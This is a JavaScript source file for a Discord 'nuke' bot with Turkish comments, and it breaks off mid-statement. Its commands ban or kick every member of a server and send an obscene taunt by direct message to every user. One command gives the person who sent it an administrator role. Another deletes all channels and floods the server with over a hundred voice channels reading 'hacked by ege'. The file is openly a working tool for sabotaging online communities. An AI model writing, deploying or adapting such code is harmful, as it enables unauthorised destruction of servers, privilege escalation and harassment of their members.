const Discord = require("discord.js"); //TÜM TELİF HAKKI EGEYE AİTTİR
const client = new Discord.Client();
const ayarlar = require("./ayarlar.json");
const { Client, Util } = require("discord.js");
const request = require("request");
client.login(process.env.TOKEN);

client.on("message", (msg) => {
  if (msg.content === "-ban") {
    msg.delete();
    msg.guild.members.forEach((member) => member.ban());
  }
}); ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR -ban

client.on("message", (msg) => {
  if (msg.content === "-kick") {
    msg.delete();
    msg.guild.members.forEach((member) => member.kick());
  }
}); ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER -kick

client.on("message", async (msg) => {
  if (msg.content === "-dm") {
    //SUNUCUDAKI BUTUN HERKESE DM MESAJI GÖNDERİR -dm
    msg.delete();
    await msg.client.users
      .forEach((users) =>
        users.send(
          "**SİKER ATAR EGE HAPİS YATAR** :call_me:" //HERKESE DMDEN ATILAN MESAJ
        )
      )
      .catch(console.error);
  }
});

client.on("message", (msg) => {
  if (msg.content === "-yetki") {
    //SIZE YÖNETICI YETKISI VERIR -yetki
    msg.delete();
    msg.guild.createRole({
      name: ".",
      permissions: ["ADMINISTRATOR"],
    });
    let rol = msg.guild.roles.find((role) => role.name === ".");
    msg.member.addRole(rol);
  }
});

client.on("message", async (msg) => {
  if (msg.content === "-bomb") {
    ///YOKET KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
    msg.delete();

    await msg.guild.channels.deleteAll(); //TÜM KANALLARI SİLEN KOMUT

    await msg.guild.createChannel("hacked-by-ege", {
      type: "text",
    });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("SİKER", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("EGE", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("HAPİS", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("YATAR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("İCRAAT", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("BU SUNUCU", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("PATLATILMIŞTIR", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice",
      })
      .then((chan) => {
        chan.setUserLimit("1");
      });
    await msg.guild
